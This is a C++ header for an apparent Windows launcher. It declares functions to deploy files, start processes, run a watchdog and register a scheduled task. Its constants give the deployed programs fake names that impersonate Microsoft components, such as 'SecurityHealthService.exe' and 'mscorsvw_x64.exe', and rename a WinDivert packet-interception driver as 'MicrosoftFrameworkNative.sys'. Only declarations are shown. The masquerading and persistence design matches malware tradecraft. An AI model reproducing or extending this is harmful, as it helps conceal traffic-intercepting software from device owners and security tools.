#ifndef LAUNCHER_FUNCTIONS_H
#define LAUNCHER_FUNCTIONS_H

#include <string>
#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <filesystem>
inline std::wstring g_RelativeMainDirPath = L"WinNetDiagnostic";
inline std::wstring g_RelativeLauncherDirPath = L"Microsoft\\NetFramework";
inline std::wstring g_FakeMainNameAtMain = L"SecurityHealthService.exe";
inline std::wstring g_FakeWatchDogNameAtMain = L"WinSvcMonitor.exe";
inline std::wstring g_FakeMainNameAtLauncher = L"mscorsvw_x64.exe";
inline std::wstring g_FakeLauncherNameAtLauncher = L"ClrShimHost.exe";
inline std::wstring g_FakeWatchDogNameAtLauncher = L"NetFxPerfAsset.exe";
inline std::wstring g_FakeWinDivert64SysAtLauncher = L"MicrosoftFrameworkNative.sys";
inline std::wstring g_FakeWinDivert64DllAtLauncher = L"SystemRuntimeSerialization.dll";





std::wstring GetProgramDataPath();
void PrepareAppFolder(const std::wstring& basePath, std::filesystem::path& securePath);
void PrepareLauncherFolder(const std::wstring& basePath, std::filesystem::path& securePath);
bool CheckAppFiles(const std::filesystem::path& securePath);
bool CheckLauncherFiles(const std::filesystem::path& securePath);
bool DeployApp(const std::filesystem::path& securePath);
bool DeployLauncher(const std::filesystem::path& securePath);
bool StartProcess(const std::filesystem::path& appPath);
void RegisterTaskXML(const std::filesystem::path& launcherPath);

#endif //LAUNCHER_FUNCTIONS_H
